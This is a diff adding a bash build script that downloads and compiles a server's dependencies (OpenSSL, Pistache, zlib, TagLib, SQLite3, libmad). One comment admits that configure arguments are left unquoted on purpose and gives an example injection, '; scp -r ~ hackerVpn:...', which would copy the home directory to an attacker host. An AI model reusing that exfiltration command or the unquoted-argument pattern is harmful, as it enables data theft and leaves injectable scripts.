@@ -1,0 +1,230 @@
+#!/usr/bin/env bash
+
+THIS_SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null && pwd )"
+SCRIPTS_DIR="${THIS_SCRIPT_DIR}"
+source "${SCRIPTS_DIR}/common" # Add the functions in 'common'
+
+SERVER_DIR="$(git rev-parse --show-toplevel)/project/server"
+
+# EXPECTED PARAMS :
+# 1 : Name of the dependency.
+# 2 : Directory containing the CMakeLists.txt script.
+# 3 : Directory to place build files in. Created if it does not exist.
+# 4 : Directory to install to.
+# 5 : File/Directory which, if it exists, makes us not trigger the build and install again.
+# 6 : CMake build type ("Release" or "Debug").
+buildWithCMake() {
+    checkParamNum 6 $# || exit 1
+    local DEPENDENCY_NAME="${1}"
+    local CMAKE_SOURCE_DIR="${2}"
+    local CMAKE_BINARY_DIR="${3}"
+    local CMAKE_INSTALL_DIR="${4}"
+    local ALREADY_BUILD_FLAG="${5}"
+    local CMAKE_BUILD_TYPE="${6}"
+
+    message $'\nBuilding and installing '"${DEPENDENCY_NAME}"$'...'
+    if [ ! -e "${ALREADY_BUILD_FLAG}" ] || [ ! -d "${CMAKE_BINARY_DIR}" ]; then
+        mkdir -p "${CMAKE_BINARY_DIR}"
+        cd "${CMAKE_BINARY_DIR}"
+        cmake -DCMAKE_BUILD_TYPE="${CMAKE_BUILD_TYPE}" -DCMAKE_INSTALL_PREFIX="${CMAKE_INSTALL_DIR}" "${CMAKE_SOURCE_DIR}"
+        make -j$(getCoreCount)
+        make -j$(getCoreCount) install
+        message $'Building '"${DEPENDENCY_NAME}"$' done!\n'
+    else
+        message $'Skipping : Already built\n'
+    fi
+}
+
+# EXPECTED PARAMS :
+# 1 : Name of the dependency.
+# 2 : Directory containing the configure script.
+# 3 : Directory to place build files in. Created if it does not exist.
+# 4 : Directory to install to.
+# 5 : File/Directory which, if it exists, makes us not trigger the build and install again.
+# 6 : Configure script name (usually 'configure' or 'config').
+# 7 : Extra arguments to the configure command. Whitespace-separated.
+# 8 : Install target.
+buildWithConfigure() {
+    checkParamNum 8 $# || exit 1
+    local DEPENDENCY_NAME="${1}"
+    local CONFIGURE_SOURCE_DIR="${2}"
+    local CONFIGURE_BINARY_DIR="${3}"
+    local CONFIGURE_INSTALL_DIR="${4}"
+    local ALREADY_BUILT_FLAG="${5}"
+    local CONFIGURE="${6}"
+    local CONFIGURE_EXTRA_ARGS="${7}"
+    local INSTALL_TARGET="${8}"
+
+    message $'\nBuilding and installing '"${DEPENDENCY_NAME}"'...'
+
+    cd "${CONFIGURE_SOURCE_DIR}"
+    if [ ! -e "${ALREADY_BUILT_FLAG}" ] || [ ! -e "${CONFIGURE_BINARY_DIR}/Makefile"  ]; then
+        mkdir -p "${CONFIGURE_BINARY_DIR}"
+        cd "${CONFIGURE_BINARY_DIR}"
+        "${CONFIGURE_SOURCE_DIR}"/"${CONFIGURE}" --prefix="${CONFIGURE_INSTALL_DIR}" ${CONFIGURE_EXTRA_ARGS} # CONFIGURE_EXTRA_ARGS was not quoted on purpose ; we might have several arguments.
+                                                                                                               # Yes, okay, this could potentially be a security risk, for example if CONFIGURE_EXTRA_ARGS
+                                                                                                               # were equal to "; scp -r ~ hackerVpn:~/hackedStuff/inf3995", but oh well.
+        make -j$(getCoreCount)
+        make -j$(getCoreCount) "${INSTALL_TARGET}"
+        message $'Building '"${DEPENDENCY_NAME}"$' done!\n'
+    else
+        message $'Skipping : Already built\n'
+    fi
+}
+
+# EXPECTED PARAMS :
+# 1 : Directory to place the dependency in.
+# 2 : URL to obtain the dependency.
+obtainWithWGet() {
+    checkParamNum 2 $# || exit 2
+    local DESTINATION_DIR="${1}"
+    local RESOURCE_URL="${2}"
+    if ! echo "${RESOURCE_URL}" | grep -Po '\.tar.gz$'; then
+        messageError "${FUNCNAME[0]}"$' : Resource "'"${RESOURCE_URL}"'" is not a tarball\n'
+        exit 1
+    fi
+    local RESOURCE_NAME=$(basename "${RESOURCE_URL}")
+    local RESOURCE_NAME_WITHOUT_EXTENSION=$(basename "${RESOURCE_URL}" .tar.gz)
+
+    if [ ! -e "${DESTINATION_DIR}/${RESOURCE_NAME}" ]; then
+        mkdir -p "${DESTINATION_DIR}"
+        cd "${DESTINATION_DIR}"
+        wget "${RESOURCE_URL}"
+        tar xzf "${RESOURCE_NAME}"
+        mv "${RESOURCE_NAME_WITHOUT_EXTENSION}"/{.,}* . 2>/dev/null # We excpect the tarball to contain a directory whose name matches
+                                                                    # exactly the tarball's name (apart from the .tar.gz extension).
+        rmdir "${RESOURCE_NAME_WITHOUT_EXTENSION}"
+    fi
+}
+
+obtainSQLite() {
+    local DESTINATION_DIR="${DEPS_DIR}/sqlite3"
+    local RESOURCE_URL="https://www.sqlite.org/src/tarball/sqlite.tar.gz"
+
+    obtainWithWGet "${DESTINATION_DIR}" "${RESOURCE_URL}"
+}
+
+obtainLibmad() {
+    local DESTINATION_DIR="${DEPS_DIR}/libmad"
+    local RESOURCE_URL="ftp://ftp.mars.org/pub/mpeg/libmad-0.15.0b.tar.gz"
+
+    obtainWithWGet "${DESTINATION_DIR}" "${RESOURCE_URL}"
+
+    # Libmad's configure script uses the '-fforce-mem' option, which isn't supported by gcc anymore.
+    # Comment out the line that adds the -fforce-mem options to the gcc flags.
+    pushd "${DESTINATION_DIR}"
+    sed configure -i -e 's|^.*-fforce-mem|#&|g' # Means : "Change the configure file by searching for all
+                                                # lines that contains -fforce-mem, and add a "#" in front of those lines."
+    popd
+}
+
+obtainDependencies() {
+    message $'\nObtaining dependencies, this should take 3-10 minutes if they are not already there...'
+
+    # Obtain submodules
+    git submodule update --init --recursive
+
+    # Obtain other dependencies
+    obtainSQLite
+    obtainLibmad
+
+    message $'Obtaining dependencies done!\n'
+}
+
+buildPistache() {
+    local SOURCE_DIR="${DEPS_DIR}/pistache"
+    local BINARY_DIR="${DEPS_DIR}/pistache/build"
+    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
+    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/cmake/pistache"
+    local BUILD_TYPE=Debug
+
+    buildWithCMake "pistache" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${BUILD_TYPE}"
+}
+
+buildOpenSsl() {
+    local SOURCE_DIR="${DEPS_DIR}/openssl"
+    local BINARY_DIR="${SOURCE_DIR}/build"
+    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
+    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libssl.a"
+    local CONFIGURE=config
+    local OPEN_SSL_CERTIFICATE_DIR="${SERVER_BINARY_DIR}/ssl"
+    local EXTRA_ARGS="--openssldir=${OPEN_SSL_CERTIFICATE_DIR}"
+    local INSTALL_TARGET=install_sw
+
+    buildWithConfigure "openssl" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
+}
+
+buildTagLib() {
+    local SOURCE_DIR="${DEPS_DIR}/taglib"
+    local BINARY_DIR="${DEPS_DIR}/taglib/build"
+    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
+    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libtag.a"
+    local BUILD_TYPE=Release
+
+    buildWithCMake "taglib" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${BUILD_TYPE}"
+}
+
+buildZLib() {
+    local SOURCE_DIR="${DEPS_DIR}/zlib"
+    local BINARY_DIR="${DEPS_DIR}/zlib/build"
+    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
+    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libz.a"
+    local BUILD_TYPE=Release
+
+    buildWithCMake "zlib" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${BUILD_TYPE}"
+}
+
+buildSqlite3() {
+    local SOURCE_DIR="${DEPS_DIR}/sqlite3"
+    local BINARY_DIR="${SOURCE_DIR}/build"
+    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
+    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libsqlite3.a"
+    local CONFIGURE=configure
+    local SQLITE3_INCLUDE_DIR="${INSTALL_DIR}/include/sqlite3"
+    local EXTRA_ARGS="--includedir=${SQLITE3_INCLUDE_DIR} --disable-tcl"
+    local INSTALL_TARGET=install
+
+    buildWithConfigure "sqlite3" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
+}
+
+buildLibmad() {
+    local SOURCE_DIR="${DEPS_DIR}/libmad"
+    local BINARY_DIR="${SOURCE_DIR}/build"
+    local INSTALL_DIR="${DEPS_INSTALL_DIR}"
+    local BUILT_FLAG="${DEPS_INSTALL_DIR}/lib/libmad.a"
+    local CONFIGURE=configure
+    local EXTRA_ARGS=""
+    local INSTALL_TARGET=install
+
+    buildWithConfigure "libmad" "${SOURCE_DIR}" "${BINARY_DIR}" "${INSTALL_DIR}" "${BUILT_FLAG}" "${CONFIGURE}" "${EXTRA_ARGS}" "${INSTALL_TARGET}"
+}
+
+buildDependencies() {
+    local DEPS_DIR="${SERVER_DIR}/lib"
+    local DEPS_INSTALL_DIR="${SERVER_DIR}/build/dependencies"
+
+    obtainDependencies
+    mkdir -p "${DEPS_INSTALL_DIR}"
+    buildOpenSsl
+    buildPistache
+    buildZLib # REQUIRED BY TAGLIB
+    buildTagLib
+    buildSqlite3
+    buildLibmad
+}
+
+buildServer() {
+    message $'\nBuilding and installing the Elevation server...'
+    cd "${SERVER_BINARY_DIR}"
+    cmake -DCMAKE_BUILD_TYPE=Debug ../src
+    make -j$(getCoreCount)
+    message $'Building the Elevation server done!\n'
+}
+
+build() {
+    local SERVER_BINARY_DIR="${SERVER_DIR}/build"
+    mkdir -p "${SERVER_BINARY_DIR}"
+
+    buildDependencies
+    buildServer
+}
